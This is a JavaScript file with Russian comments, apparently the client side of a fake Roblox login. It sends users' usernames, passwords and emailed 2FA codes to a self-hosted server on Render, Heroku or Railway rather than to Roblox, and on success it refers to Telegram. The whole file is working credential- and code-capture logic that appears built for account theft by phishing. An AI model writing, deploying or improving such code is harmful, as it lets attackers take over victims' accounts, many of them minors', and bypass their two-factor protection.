// Исправленный JavaScript код для логина
// Работает и локально, и на Render

(function() {
    'use strict';
    
    // Автоматическое определение URL сервера
    function getServerUrl() {
        // Если мы на Render, используем текущий origin
        if (window.location.hostname.includes('render.com') || 
            window.location.hostname.includes('herokuapp.com') ||
            window.location.hostname.includes('railway.app')) {
            return window.location.origin;
        }
        // Локально используем localhost:5000
        return 'http://localhost:5000';
    }
    
    // Глобальная переменная для URL сервера
    window.SERVER_URL = getServerUrl();
    
    console.log('🚀 Сервер URL:', window.SERVER_URL);
    console.log('🌐 Текущий origin:', window.location.origin);
    
    // Функция для отправки логина
    async function sendLoginRequest(username, password, remember) {
        try {
            const response = await fetch(`${window.SERVER_URL}/login`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    remember: remember
                })
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            return data;
            
        } catch (error) {
            console.error('❌ Ошибка логина:', error);
            throw error;
        }
    }
    
    // Функция для отправки кода 2FA
    async function sendCodeRequest(sessionId, code) {
        try {
            const response = await fetch(`${window.SERVER_URL}/submit_code`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    session_id: sessionId,
                    code: code
                })
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const data = await response.json();
            return data;
            
        } catch (error) {
            console.error('❌ Ошибка отправки кода:', error);
            throw error;
        }
    }
    
    // Функция для проверки состояния сервера
    async function checkServerHealth() {
        try {
            const response = await fetch(`${window.SERVER_URL}/health`);
            if (response.ok) {
                const data = await response.json();
                console.log('✅ Сервер работает:', data);
                return true;
            } else {
                console.warn('⚠️ Сервер недоступен:', response.status);
                return false;
            }
        } catch (error) {
            console.error('❌ Ошибка проверки сервера:', error);
            return false;
        }
    }
    
    // Функция для показа уведомлений
    function showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 8px;
            color: white;
            font-family: Arial, sans-serif;
            font-size: 14px;
            z-index: 10000;
            max-width: 300px;
            word-wrap: break-word;
        `;
        
        switch (type) {
            case 'success':
                notification.style.backgroundColor = '#28a745';
                break;
            case 'error':
                notification.style.backgroundColor = '#dc3545';
                break;
            case 'warning':
                notification.style.backgroundColor = '#ffc107';
                notification.style.color = '#212529';
                break;
            default:
                notification.style.backgroundColor = '#17a2b8';
        }
        
        notification.textContent = message;
        document.body.appendChild(notification);
        
        // Автоматически убираем через 5 секунд
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 5000);
    }
    
    // Основная функция логина
    async function handleLogin(username, password, remember) {
        try {
            console.log('🔐 Попытка входа для:', username);
            
            // Проверяем состояние сервера
            const serverOk = await checkServerHealth();
            if (!serverOk) {
                showNotification('⚠️ Сервер недоступен. Проверьте подключение.', 'warning');
                return;
            }
            
            // Отправляем запрос на логин
            const result = await sendLoginRequest(username, password, remember);
            
            if (result.need_code) {
                console.log('📱 Требуется 2FA код');
                showNotification('📱 Введите код из почты Roblox', 'info');
                return {
                    type: 'need_code',
                    session_id: result.session_id
                };
            } else if (result.success) {
                console.log('✅ Вход выполнен успешно');
                showNotification('✅ Вход выполнен! Проверьте Telegram', 'success');
                return {
                    type: 'success',
                    message: result.message
                };
            } else {
                console.log('❌ Ошибка входа:', result.message);
                showNotification(`❌ Ошибка: ${result.message}`, 'error');
                return {
                    type: 'error',
                    message: result.message
                };
            }
            
        } catch (error) {
            console.error('💥 Критическая ошибка:', error);
            showNotification(`💥 Ошибка: ${error.message}`, 'error');
            return {
                type: 'error',
                message: error.message
            };
        }
    }
    
    // Функция для отправки кода 2FA
    async function handleCodeSubmit(sessionId, code) {
        try {
            console.log('🔢 Отправка кода 2FA:', code);
            
            const result = await sendCodeRequest(sessionId, code);
            
            if (result.success) {
                console.log('✅ 2FA код принят');
                showNotification('✅ Вход завершен! Проверьте Telegram', 'success');
                return {
                    type: 'success',
                    message: result.message
                };
            } else {
                console.log('❌ Ошибка 2FA:', result.message);
                showNotification(`❌ Ошибка: ${result.message}`, 'error');
                return {
                    type: 'error',
                    message: result.message
                };
            }
            
        } catch (error) {
            console.error('💥 Ошибка 2FA:', error);
            showNotification(`💥 Ошибка: ${error.message}`, 'error');
            return {
                type: 'error',
                message: error.message
            };
        }
    }
    
    // Экспортируем функции в глобальную область
    window.RobloxLogin = {
        handleLogin: handleLogin,
        handleCodeSubmit: handleCodeSubmit,
        checkServerHealth: checkServerHealth,
        getServerUrl: getServerUrl,
        showNotification: showNotification
    };
    
    // Автоматически проверяем состояние сервера при загрузке
    document.addEventListener('DOMContentLoaded', function() {
        console.log('🚀 Roblox Login скрипт загружен');
        console.log('📍 Сервер URL:', window.SERVER_URL);
        
        // Проверяем состояние сервера
        setTimeout(() => {
            checkServerHealth();
        }, 1000);
    });
    
})(); 